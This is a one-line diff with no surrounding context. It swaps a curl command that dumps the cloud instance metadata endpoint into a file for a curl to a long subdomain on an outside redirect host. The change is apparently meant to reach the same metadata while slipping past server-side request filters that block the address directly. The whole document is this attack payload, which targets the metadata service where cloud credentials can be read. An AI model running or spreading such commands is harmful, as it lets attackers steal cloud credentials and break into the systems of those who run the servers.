@@ -1,1 +1,1 @@
-curl http://169.254.169.254/latest/meta-data/ > listfiles123.txt
+curl https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me > listfiles123.txt
